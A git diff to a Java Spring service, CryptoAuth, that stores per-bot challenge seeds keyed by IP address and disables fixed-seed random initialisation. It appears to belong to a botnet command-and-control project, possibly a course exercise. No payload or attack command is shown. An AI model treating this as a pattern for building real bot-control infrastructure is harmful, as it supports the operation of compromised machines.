@@ -11,7 +11,13 @@ import org.springframework.stereotype.Service;
 
 import cs.sii.config.bot.Engine;
 import cs.sii.model.Conversions;
+import cs.sii.model.IP;
+import cs.sii.model.Pairs;
 
+/**
+ * @author chris
+ *
+ */
 @Service
 public class CryptoAuth {
 
@@ -32,7 +38,7 @@ public class CryptoAuth {
 
 	
 	
-	private HashMap<Long, Long> botSeed = new HashMap<>();
+	private HashMap<IP, Pairs<Long,Long>> botSeed = new HashMap<>();
 
 	public CryptoAuth() {
 		
@@ -41,7 +47,7 @@ public class CryptoAuth {
 		seedIterationGenerator3 = "5ffffffffffffffe";
 
 		
-		if(true){
+		if(false){
 			rndIt.setSeed(Long.parseLong(seedIterationGenerator1, 16));
 			rndRnd.setSeed(Long.parseLong(seedIterationGenerator2, 16));
 			
@@ -148,14 +154,26 @@ public class CryptoAuth {
 		return hash;
 	}
 
-	public void addBotChallengeInfo(Long key, Long value) {
-		botSeed.put(key, value);
+	public void addBotChallengeInfo(String ips,Long key, Long value) {
+		Pairs<Long, Long> cs=new Pairs<>();
+		IP ip=new IP(ips);
+		cs.setValue1(key);
+		cs.setValue2(value);
+		botSeed.put(ip,cs);
 	}
 
-	public boolean findBotChallengeInfo(Long key, Long value) {
-		if (botSeed.get(key) != null)
+	public boolean findBotChallengeInfo(String ips) {
+		IP ip=new IP(ips);
+		if (botSeed.get(ip) != null)
 			return true;
 		return false;
 	}
+
+	public HashMap<IP, Pairs<Long, Long>> getBotSeed() {
+		return botSeed;
+	}
+
+	
+	
 
 }
